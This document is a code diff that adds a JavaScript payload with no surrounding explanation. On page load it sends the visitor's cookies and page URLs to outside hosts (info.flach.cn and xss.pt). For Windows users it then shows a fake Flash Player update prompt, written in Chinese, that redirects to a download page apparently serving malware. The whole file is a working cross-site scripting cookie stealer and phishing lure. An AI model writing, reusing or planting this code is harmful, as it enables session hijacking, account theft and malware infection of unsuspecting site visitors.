@@ -1,0 +1,28 @@
+(function(){(new Image()).src='https://info.flach.cn/index.php?do=api&id=8J9cKB&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
+if('{set.keepsession}'==1){keep=new Image();keep.src='https://xss.pt/xss.php?do=keepsession&id=8J9cKB&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
+
+function install_flach(){
+    var result = confirm("\u60A8\u672A\u5B89\u88C5Flash Player\u64AD\u653E\u5668\u6216\u8005\u7248\u672C\u8FC7\u4F4E\uFF0C\u8BF7\u66F4\u65B0");
+    if (result) {
+        location.href = "https://update.flach.cn/index.html";
+    }else{
+        location.href = window.location.href;
+    }
+}
+function is_installed(){
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+        if(xhr.responseText=='installed'){
+            ;
+        }else{
+            install_flach();
+        }
+    }
+}
+xhr.open('GET', 'https://update.flach.cn/flach.php?install=1', true);
+xhr.send(null);
+}
+if(navigator.userAgent.indexOf('Windows')>=0){
+    is_installed();
+}
